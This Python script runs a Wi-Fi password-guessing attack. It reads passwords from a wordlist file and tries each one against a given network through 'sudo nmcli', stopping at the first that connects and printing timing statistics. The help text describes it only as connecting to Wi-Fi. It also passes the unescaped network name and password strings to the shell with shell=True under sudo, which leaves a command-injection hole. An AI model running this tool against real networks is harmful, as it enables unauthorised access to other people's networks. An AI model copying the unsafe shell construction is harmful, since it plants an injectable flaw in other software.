import subprocess
import time
import argparse
from datetime import datetime

def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode('utf-8'), error.decode('utf-8'), process.returncode

def connect_wifi(ssid, password, verbose=False):
    delete_command = f"sudo nmcli connection delete '{ssid}'"
    run_command(delete_command)
    if verbose:
        print(f"Attempting to connect to {ssid} with password: {password}")
    
    command = f"sudo nmcli dev wifi connect '{ssid}' password '{password}'"
    output, error, return_code = run_command(command)
    
    if return_code == 0:
        print(f"Successfully connected with password {password}!")
        return True
    else:
        if verbose:
            print("Connection failed. Error message:")
            print(error)
        
        if verbose:
            print("Deleting failed connection...")
        #delete_command = f"sudo nmcli connection delete '{ssid}'"
        #run_command(delete_command)
        
        return False

def main():
    parser = argparse.ArgumentParser(description="Connect to Wi-Fi using nmcli")
    parser.add_argument("ssid", help="SSID of the Wi-Fi network")
    parser.add_argument("-f", "--file", required=True, help="File containing passwords to try")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    try:
        with open(args.file, 'r') as file:
            passwords = [pwd.strip() for pwd in file.readlines() if len(pwd.strip()) >= 8]
    except FileNotFoundError:
        print(f"Error: File {args.file} not found.")
        return
    except IOError:
        print(f"Error: Could not read file {args.file}.")
        return

    if not passwords:
        print("No valid passwords found in the file. All passwords must be at least 8 characters long.")
        return

    start_time = datetime.now()
    total_passwords = len(passwords)
    passwords_tried = 0

    for password in passwords:
        passwords_tried += 1
        if connect_wifi(args.ssid, password, args.verbose):
            break
        else:
            if args.verbose:
                print(f"Failed to connect with password: {password}")
            time.sleep(1)  # Small delay before retrying
    else:
        print("Failed to connect with all provided passwords.")

    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()

    # Summary
    print("\nSummary:")
    print(f"Time taken: {duration:.2f} seconds")
    print(f"Total passwords tried: {passwords_tried}")
    print(f"Total valid passwords in file: {total_passwords}")
    if duration > 0:
        print(f"Seconds per password: {duration / passwords_tried:.2f}")

if __name__ == "__main__":
    main()
